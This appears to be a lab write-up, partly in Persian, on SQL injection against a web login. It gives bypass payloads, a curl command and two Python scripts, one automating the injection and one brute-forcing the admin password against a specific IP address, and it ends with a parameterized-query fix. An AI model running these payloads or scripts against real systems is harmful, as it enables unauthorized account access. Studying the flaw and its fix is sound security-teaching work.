# 1. login with website

```
admin' --
123
```
<p dir="rtl" align="justify">رشته ثابت اول:</p>

```
SELECT * FROM users WHERE username='
```

<p dir="rtl" align="justify">رشته ورودی کاربر:</p>

```
admin' --
```

<p dir="rtl" align="justify">رشته ثابت دوم:</p>

```
' AND password='{password}'
```

<p dir="rtl" align="justify">کوئری اصلی:</p>

```sql
SELECT * FROM users WHERE username='{username}' AND password='{password}'
```

<p dir="rtl" align="justify">بعد از injection:</p>

```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='123'
```

```
' OR '1'='1' --
123
```
<p dir="rtl" align="justify">بعد از injection:</p>

```sql
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='123'
```

# 2. curl

```
curl -v -X POST "http://82.115.20.217/login" -d "username=' OR '1'='1' --&password=123"
```

# 3.

```
python3 -m venv myenv
source myenv/bin/activate
pip install requests beautifulsoup4
```
```
nano sql_injection.py
```
```python
import requests

def simple_sql_test():
    url = "http://82.115.20.217/login"
    
    # Payload that should work if SQL injection is possible
    payload = "admin' OR '1'='1' --"
    
    data = {
        "username": payload,
        "password": "anything"
    }
    
    session = requests.Session()
    
    try:
        response = session.post(url, data=data, allow_redirects=False)
        
        print(f"Status: {response.status_code}")
        print(f"Redirect: {response.headers.get('Location', 'None')}")
        
        if response.status_code == 302:
            print("Likely SQL injection successful!")
            print("Trying to access protected page...")
            
            # Try to access the main page with the session
            main_page = session.get("http://82.115.20.217/")
            print(f"Main page status: {main_page.status_code}")
            print(f"Main page length: {len(main_page.text)}")
            
        else:
            print("SQL injection may have failed")
            
    except Exception as e:
        print(f"Error: {e}")

# Run the simple test
simple_sql_test()
```
```
python3 sql_injection.py
```

# 4. Brute Force

```
nano brute-force.py
```
```python
import requests

target_url = "http://82.115.20.217/login"
username = "admin"
passwords = ["123456", "password", "admin123", "123", "admin", "1234", "12345"]

session = requests.Session()

for password in passwords:
    data = {"username": username, "password": password}
    
    try:
        response = session.post(target_url, data=data, allow_redirects=False)
        
        if (response.status_code == 302 or
            "location" in response.headers and response.headers["location"] == "/" or
            "Set-Cookie" in response.headers and "session" in response.headers["Set-Cookie"] or
            response.url != target_url):
            
            print(f"Password found: {password}")
            print(f"Status Code: {response.status_code}")
            print(f"Redirect URL: {response.headers.get('location', 'None')}")
            print(f"Session Cookie: {response.headers.get('Set-Cookie', 'None')}")
            break
            
        else:
            print(f"Failed: {password} (Status: {response.status_code})")
            
    except Exception as e:
        print(f" Error with {password}: {e}")

print("Testing with known working credentials...")
test_data = {"username": "admin", "password": "admin123"}
response = session.post(target_url, data=test_data, allow_redirects=True)

print(f"Final Status: {response.status_code}")
print(f"Final URL: {response.url}")
print(f"Response length: {len(response.text)} characters")
print("First 200 chars of response:")
print(response.text[:200])
```
```
python3 brute-force.py
```

# 5. 

### the wrong way

```sql
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

### the right way

```sql
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```
